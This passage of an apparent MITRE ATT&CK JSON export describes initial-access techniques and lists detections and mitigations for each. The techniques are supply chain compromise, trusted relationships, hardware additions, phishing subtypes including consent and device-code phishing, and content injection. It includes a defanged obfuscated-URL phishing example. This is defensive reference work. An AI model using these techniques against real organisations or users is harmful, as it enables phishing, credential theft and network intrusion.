class=\"citation\">(Citation: OWASP Top 10)</a>"},{"id":"M1033","name":"Limit Software Installation","description":"Where possible, consider requiring developers to pull from internal repositories containing verified and approved packages rather than from external ones. <a href=\"https://www.cidersecurity.io/top-10-cicd-security-risks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cider Security Top 10 CICD Security Risks)</a>"},{"id":"M1051","name":"Update Software","description":"A patch management process should be implemented to check unused dependencies, unmaintained and/or previously vulnerable dependencies, unnecessary features, components, files, and documentation."}]},{"id":"T1195.002","name":"Compromise Software Supply Chain","description":"Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.\n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. <a href=\"https://blog.avast.com/new-investigations-in-ccleaner-incident-point-to-a-possible-third-stage-that-had-keylogger-capacities\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Avast CCleaner3 2018)</a> <a href=\"https://www.commandfive.com/papers/C5_APT_SKHack.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Command Five SK 2011)</a>","detection":"Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity.","platforms":["Linux","Windows","macOS"],"dataSources":["File: File Metadata"],"mitigations":[{"id":"M1016","name":"Vulnerability Scanning","description":"Continuous monitoring of vulnerability sources and the use of automatic and manual code review tools should also be implemented as well. <a href=\"https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OWASP Top 10)</a>"},{"id":"M1051","name":"Update Software","description":"A patch management process should be implemented to check unused applications, unmaintained and/or previously vulnerable software, unnecessary features, components, files, and documentation."}]},{"id":"T1195.003","name":"Compromise Hardware Supply Chain","description":"Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.","detection":"Perform physical inspection of hardware to look for potential tampering. Perform integrity checking on pre-OS boot mechanisms that can be manipulated for malicious purposes.","platforms":["Linux","macOS","Windows"],"dataSources":["Sensor Health: Host Status"],"mitigations":[{"id":"M1046","name":"Boot Integrity","description":"Use Trusted Platform Module technology and a secure or trusted boot process to prevent system integrity from being compromised. Check the integrity of the existing BIOS or EFI to determine if it is vulnerable to modification. <a href=\"http://www.trustedcomputinggroup.org/wp-content/uploads/Trusted-Platform-Module-Summary_04292008.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TCG Trusted Platform Module)</a> <a href=\"https://docs.microsoft.com/en-us/windows/security/information-protection/secure-the-windows-10-boot-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Secure Boot Process)</a>"}]}]},{"id":"T1199","name":"Trusted Relationship","description":"Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, Valid Accounts used by the other party for access to internal network systems may be compromised and used. <a href=\"https://us-cert.cisa.gov/APTs-Targeting-IT-Service-Provider-Customers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA IT Service Providers)</a>\n\nIn Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant. <a href=\"https://support.microsoft.com/en-us/topic/partners-offer-delegated-administration-26530dc0-ebba-415b-86b1-b55bc06b073e?ui=en-us&rs=en-us&ad=us\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Office 365 Delegated Administration)</a>","detection":"Establish monitoring for activity conducted by second and third party providers and other trusted entities that may be leveraged as a means to gain access to the network. Depending on the type of relationship, an adversary may have access to significant amounts of information about the target before conducting an operation, especially if the trusted relationship is based on IT services. Adversaries may be able to act quickly towards an objective, so proper monitoring for behavior related to Credential Access, Lateral Movement, and Collection will be important to detect the intrusion.","platforms":["IaaS","Identity Provider","Linux","macOS","Office Suite","SaaS","Windows"],"dataSources":["Logon Session: Logon Session Creation","Logon Session: Logon Session Metadata","Network Traffic: Network Traffic Content","Application Log: Application Log Content"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Properly manage accounts and permissions used by parties in trusted relationships to minimize potential abuse by the party and if the party is compromised by an adversary. In Office 365 environments, partner relationships and roles can be viewed under the “Partner Relationships” page. <a href=\"https://docs.microsoft.com/en-us/microsoft-365/commerce/manage-partners?view=o365-worldwide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Office 365 Partner Relationships)</a>"},{"id":"M1030","name":"Network Segmentation","description":"Network segmentation can be used to isolate infrastructure components that do not require broad network access."},{"id":"M1032","name":"Multi-factor Authentication","description":"Require MFA for all delegated administrator accounts. <a href=\"https://www.microsoft.com/security/blog/2021/10/25/nobelium-targeting-delegated-administrative-privileges-to-facilitate-broader-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Nobelium Admin Privileges)</a>"}],"subTechniques":[]},{"id":"T1200","name":"Hardware Additions","description":"Adversaries may physically introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e. Replication Through Removable Media), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused.\n\nWhile public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e. Adversary-in-the-Middle), keystroke injection, kernel memory reading via DMA, addition of new wireless access points to an existing network, and others. <a href=\"https://ossmann.blogspot.com/2011/02/throwing-star-lan-tap.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ossmann Star Feb 2011)</a> <a href=\"https://www.youtube.com/watch?v=lDvf4ScWbcQ\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Aleks Weapons Nov 2015)</a> <a href=\"https://www.youtube.com/watch?v=fXthwl6ShOg\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Frisk DMA August 2016)</a> <a href=\"https://arstechnica.com/information-technology/2012/03/the-pwn-plug-is-a-little-white-box-that-can-hack-your-network/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: McMillan Pwn March 2012)</a>","detection":"Asset management systems may help with the detection of computer systems or network devices that should not exist on a network. \n\nEndpoint sensors may be able to detect the addition of hardware via USB, Thunderbolt, and other external device communication ports.","platforms":["Windows","Linux","macOS"],"dataSources":["Network Traffic: Network Traffic Flow","Drive: Drive Creation","Application Log: Application Log Content"],"mitigations":[{"id":"M1034","name":"Limit Hardware Installation","description":"Block unknown devices and accessories by endpoint security configuration and monitoring agent."},{"id":"M1035","name":"Limit Access to Resource Over Network","description":"Establish network access control policies, such as using device certificates and the 802.1x standard. <a href=\"https://en.wikipedia.org/wiki/IEEE_802.1X\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia 802.1x)</a> Restrict use of DHCP to registered devices to prevent unregistered devices from communicating with trusted systems."}],"subTechniques":[]},{"id":"T1566","name":"Phishing","description":"Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\n\nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., Email Hiding Rules). <a href=\"https://www.microsoft.com/en-us/security/blog/2022/09/22/malicious-oauth-applications-used-to-compromise-email-servers-and-spread-spam/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft OAuth Spam 2022)</a> <a href=\"https://unit42.paloaltonetworks.com/examining-vba-initiated-infostealer-campaign/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Palo Alto Unit 42 VBA Infostealer 2014)</a> Another way to accomplish this is by Email Spoofing <a href=\"https://www.proofpoint.com/us/threat-reference/email-spoofing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Proofpoint-spoof)</a> the identity of the sender, which can be used to fool both the human recipient as well as automated security tools, <a href=\"https://blog.cyberproof.com/blog/double-bounced-attacks-with-email-spoofing-2022-trends\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: cyberproof-double-bounce)</a> or by including the intended target as a party to an existing email thread that includes malicious files or links (i.e., \"thread hijacking\"). <a href=\"https://krebsonsecurity.com/2024/03/thread-hijacking-phishes-that-prey-on-your-curiosity/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: phishing-krebs)</a>\n\nVictims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware, <a href=\"https://blog.sygnia.co/luna-moth-false-subscription-scams\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: sygnia Luna Month)</a> <a href=\"https://www.cisa.gov/uscert/ncas/alerts/aa23-025a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA Remote Monitoring and Management Software)</a> or install adversary-accessible remote management tools onto their computer (i.e., User Execution). <a href=\"https://unit42.paloaltonetworks.com/luna-moth-callback-phishing/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit42 Luna Moth)</a>","detection":"Network intrusion detection systems and email gateways can be used to detect phishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\n\nFiltering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed. <a href=\"https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Anti Spoofing)</a> <a href=\"https://web.archive.org/web/20210708014107/https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ACSC Email Spoofing)</a>\n\nURL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites. Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.\n\nBecause most common third-party services used for phishing via service leverage TLS encryption, SSL/TLS inspection is generally required to detect the initial communication/delivery. With SSL/TLS inspection intrusion detection signatures or other security gateway appliances may be able to detect malware.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded on the user's computer. Many possible detections of follow-on behavior may take place once User Execution occurs.","platforms":["Identity Provider","Linux","macOS","Office Suite","SaaS","Windows"],"dataSources":["File: File Creation","Network Traffic: Network Traffic Flow","Application Log: Application Log Content","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1017","name":"User Training","description":"Users can be trained to identify social engineering techniques and phishing emails."},{"id":"M1021","name":"Restrict Web-Based Content","description":"Determine if certain websites or attachment types (ex: .scr, .exe, .pif, .cpl, etc.) that can be used for phishing are necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion prevention systems and systems designed to scan and remove malicious email attachments or links can be used to block activity."},{"id":"M1047","name":"Audit","description":"Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses."},{"id":"M1049","name":"Antivirus/Antimalware","description":"Anti-virus can automatically quarantine suspicious files."},{"id":"M1054","name":"Software Configuration","description":"Use anti-spoofing and email authentication mechanisms to filter messages based on validity checks of the sender domain (using SPF) and integrity of messages (using DKIM). Enabling these mechanisms within an organization (through policies such as DMARC) may enable recipients (intra-org and cross domain) to perform similar message filtering and validation. <a href=\"https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Anti Spoofing)</a> <a href=\"https://web.archive.org/web/20210708014107/https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ACSC Email Spoofing)</a>"}],"subTechniques":[{"id":"T1566.001","name":"Spearphishing Attachment","description":"Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. <a href=\"https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 DarkHydrus July 2018)</a> Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.","detection":"Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\n\nFiltering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed. <a href=\"https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Anti Spoofing)</a> <a href=\"https://web.archive.org/web/20210708014107/https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ACSC Email Spoofing)</a>\n\nAnti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as Exploitation for Client Execution or usage of malicious scripts.\n\nMonitor for suspicious descendant process spawning from Microsoft Office and other productivity software. <a href=\"https://www.elastic.co/blog/embracing-offensive-tooling-building-detections-against-koadic-using-eql\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic - Koadiac Detection with EQL)</a>","platforms":["Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow","Application Log: Application Log Content","File: File Creation"],"mitigations":[{"id":"M1017","name":"User Training","description":"Users can be trained to identify social engineering techniques and spearphishing emails."},{"id":"M1018","name":"User Account Management","description":"Apply user account management principles to limit permissions for accounts interacting with email attachments, ensuring that only necessary accounts have the ability to open or execute files. Restricting account privileges reduces the potential impact of malicious attachments by preventing unauthorized execution or spread of malware within the environment."},{"id":"M1021","name":"Restrict Web-Based Content","description":"Block unknown or unused attachments by default that should not be transmitted over email as a best practice to prevent some vectors, such as .scr, .exe, .pif, .cpl, etc. Some email scanning devices can open and analyze compressed and encrypted formats, such as zip and rar that may be used to conceal malicious attachments."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion prevention systems and systems designed to scan and remove malicious email attachments can be used to block activity."},{"id":"M1047","name":"Audit","description":"Enable auditing and monitoring for email attachments and file transfers to detect and investigate suspicious activity. Regularly review logs for anomalies related to attachments containing potentially malicious content, as well as any attempts to execute or interact with these files. This practice helps identify spearphishing attempts before they can lead to further compromise."},{"id":"M1049","name":"Antivirus/Antimalware","description":"Anti-virus can also automatically quarantine suspicious files."},{"id":"M1054","name":"Software Configuration","description":"Use anti-spoofing and email authentication mechanisms to filter messages based on validity checks of the sender domain (using SPF) and integrity of messages (using DKIM). Enabling these mechanisms within an organization (through policies such as DMARC) may enable recipients (intra-org and cross domain) to perform similar message filtering and validation. <a href=\"https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Anti Spoofing)</a> <a href=\"https://web.archive.org/web/20210708014107/https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ACSC Email Spoofing)</a>"}]},{"id":"T1566.002","name":"Spearphishing Link","description":"Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.\n\nAdversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\"). <a href=\"https://us-cert.cisa.gov/ncas/tips/ST05-016\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA IDN ST05-016)</a> URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@” symbol: for example, <code>hxxp://google.com@1157586937</code>. <a href=\"https://www.mandiant.com/resources/blog/url-obfuscation-schema-abuse\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant URL Obfuscation 2023)</a>\n\nAdversaries may also utilize links to perform consent phishing/spearphishing campaigns to Steal Application Access Tokens that grant immediate access to the victim environment. For example, a user may be lured into granting adversaries permissions/access via a malicious OAuth 2.0 request URL that when accepted by the user provide permissions/access for malicious applications. <a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trend Micro Pawn Storm OAuth 2017)</a> <a href=\"https://www.microsoft.com/security/blog/2021/07/14/microsoft-delivers-comprehensive-solution-to-battle-rise-in-consent-phishing-emails/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft OAuth 2.0 Consent Phishing 2021)</a> These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. <a href=\"https://www.microsoft.com/security/blog/2021/07/14/microsoft-delivers-comprehensive-solution-to-battle-rise-in-consent-phishing-emails/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft OAuth 2.0 Consent Phishing 2021)</a>\n\nSimilarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as “device code phishing,” an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token. <a href=\"https://www.secureworks.com/blog/oauths-device-code-flow-abused-in-phishing-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SecureWorks Device Code Phishing 2021)</a> <a href=\"https://www.netskope.com/blog/new-phishing-attacks-exploiting-oauth-authorization-flows-part-1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Netskope Device Code Phishing 2021)</a> <a href=\"https://www.optiv.com/insights/source-zero/blog/microsoft-365-oauth-device-code-flow-and-phishing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Optiv Device Code Phishing 2021)</a>","detection":"URL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites as well as links redirecting to adversary infrastructure based by upon suspicious OAuth patterns with unusual TLDs. <a href=\"https://www.microsoft.com/security/blog/2021/07/14/microsoft-delivers-comprehensive-solution-to-battle-rise-in-consent-phishing-emails/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft OAuth 2.0 Consent Phishing 2021)</a>. Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.\n\nFiltering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed. <a href=\"https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Anti Spoofing)</a> <a href=\"https://web.archive.org/web/20210708014107/https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ACSC Email Spoofing)</a>\n\nBecause this technique usually involves user interaction on the endpoint, many of the possible detections take place once User Execution occurs.","platforms":["Identity Provider","Linux","macOS","Office Suite","SaaS","Windows"],"dataSources":["Network Traffic: Network Traffic Flow","Application Log: Application Log Content","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1017","name":"User Training","description":"Users can be trained to identify social engineering techniques and spearphishing emails with malicious links which includes phishing for consent with OAuth 2.0. Additionally, users may perform visual checks of the domains they visit; however, homographs in ASCII and in IDN domains and URL schema obfuscation may render manual checks difficult. Use email warning banners to alert users when emails contain links from external senders, prompting them to exercise caution and reducing the likelihood of falling victim to spearphishing attacks. Phishing training and other cybersecurity training may raise awareness to check URLs before visiting the sites."},{"id":"M1018","name":"User Account Management","description":"Azure AD Administrators apply limitations upon the ability for users to grant consent to unfamiliar or unverified third-party applications."},{"id":"M1021","name":"Restrict Web-Based Content","description":"Determine if certain websites that can be used for spearphishing are necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk."},{"id":"M1047","name":"Audit","description":"Audit applications and their permissions to ensure access to data and resources are limited based upon necessity and principle of least privilege."},{"id":"M1054","name":"Software Configuration","description":"Use anti-spoofing and email authentication mechanisms to filter messages based on validity checks of the sender domain (using SPF) and integrity of messages (using DKIM). Enabling these mechanisms within an organization (through policies such as DMARC) may enable recipients (intra-org and cross domain) to perform similar message filtering and validation. <a href=\"https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Anti Spoofing)</a> <a href=\"https://web.archive.org/web/20210708014107/https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ACSC Email Spoofing)</a>.\n\nFurthermore, policies may enforce / install browser extensions that protect against IDN and homograph attacks."}]},{"id":"T1566.003","name":"Spearphishing via Service","description":"Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. <a href=\"https://info.lookout.com/rs/051-ESQ-475/images/Lookout_Dark-Caracal_srr_20180118_us_v.1.0.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Lookout Dark Caracal Jan 2018)</a> These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.\n\nA common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.","detection":"Because most common third-party services used for spearphishing via service leverage TLS encryption, SSL/TLS inspection is generally required to detect the initial communication/delivery. With SSL/TLS inspection intrusion detection signatures or other security gateway appliances may be able to detect malware. \n\nAnti-virus can potentially detect malicious documents and files that are downloaded on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as Exploitation for Client Execution or usage of malicious scripts.","platforms":["Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Flow","Application Log: Application Log Content","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1017","name":"User Training","description":"Users can be trained to identify social engineering techniques and spearphishing messages with malicious links."},{"id":"M1018","name":"User Account Management","description":"Enforce strict user account management policies on third-party service accounts to control access and limit privileges. Configure accounts with the minimum permissions necessary to perform their roles and regularly review access levels. This minimizes the risk of adversaries exploiting service accounts to execute spearphishing attacks or gain unauthorized access to sensitive resources."},{"id":"M1021","name":"Restrict Web-Based Content","description":"Determine if certain social media sites, personal webmail services, or other service that can be used for spearphishing is necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk."},{"id":"M1047","name":"Audit","description":"Implement auditing and logging for interactions with third-party messaging services or collaboration platforms. Monitor user activity and review logs for signs of suspicious links, downloads, or file exchanges that could indicate spearphishing attempts. Effective auditing allows for the quick identification of malicious activity originating from compromised service accounts."},{"id":"M1049","name":"Antivirus/Antimalware","description":"Anti-virus can also automatically quarantine suspicious files."}]},{"id":"T1566.004","name":"Spearphishing Voice","description":"Adversaries may use voice communications to ultimately gain access to victim systems. Spearphishing voice is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of manipulating a user into providing access to systems through a phone call or other forms of voice communications. Spearphishing frequently involves social engineering techniques, such as posing as a trusted source (ex: Impersonation) and/or creating a sense of urgency or alarm for the recipient.\n\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries are not directly sending malware to a victim vice relying on User Execution for delivery and execution. For example, victims may receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware, <a href=\"https://blog.sygnia.co/luna-moth-false-subscription-scams\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: sygnia Luna Month)</a> <a href=\"https://www.cisa.gov/uscert/ncas/alerts/aa23-025a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA Remote Monitoring and Management Software)</a> or install adversary-accessible remote management tools (Remote Access Tools) onto their computer. <a href=\"https://unit42.paloaltonetworks.com/luna-moth-callback-phishing/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit42 Luna Moth)</a>\n\nAdversaries may also combine voice phishing with Multi-Factor Authentication Request Generation in order to trick users into divulging MFA credentials or accepting authentication prompts. <a href=\"https://www.proofpoint.com/us/threat-reference/vishing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Proofpoint Vishing)</a>","detection":"","platforms":["Linux","macOS","Windows","Identity Provider"],"dataSources":["Application Log: Application Log Content"],"mitigations":[{"id":"M1017","name":"User Training","description":"Users can be trained to identify and report social engineering techniques and spearphishing attempts, while also being suspicious of and verifying the identify of callers. <a href=\"https://www.cisa.gov/news-events/news/avoiding-social-engineering-and-phishing-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA Phishing)</a>"}]}]},{"id":"T1659","name":"Content Injection","description":"Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., Drive-by Target followed by Drive-by Compromise), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., Ingress Tool Transfer) and other data to already compromised systems. <a href=\"https://www.welivesecurity.com/en/eset-research/moustachedbouncer-espionage-against-foreign-diplomats-in-belarus/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET MoustachedBouncer)</a>\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (<strong>Note:</strong> this is similar but distinct from Adversary-in-the-Middle, which describes AiTM activity solely within an enterprise environment) <a href=\"https://encyclopedia.kaspersky.com/glossary/man-in-the-middle-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky Encyclopedia MiTM)</a>\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server <a href=\"https://usa.kaspersky.com/blog/man-on-the-side/27854/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky ManOnTheSide)</a>\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\" <a href=\"https://usa.kaspersky.com/blog/man-on-the-side/27854/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky ManOnTheSide)</a> <a href=\"https://www.welivesecurity.com/en/eset-research/moustachedbouncer-espionage-against-foreign-diplomats-in-belarus/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET MoustachedBouncer)</a> <a 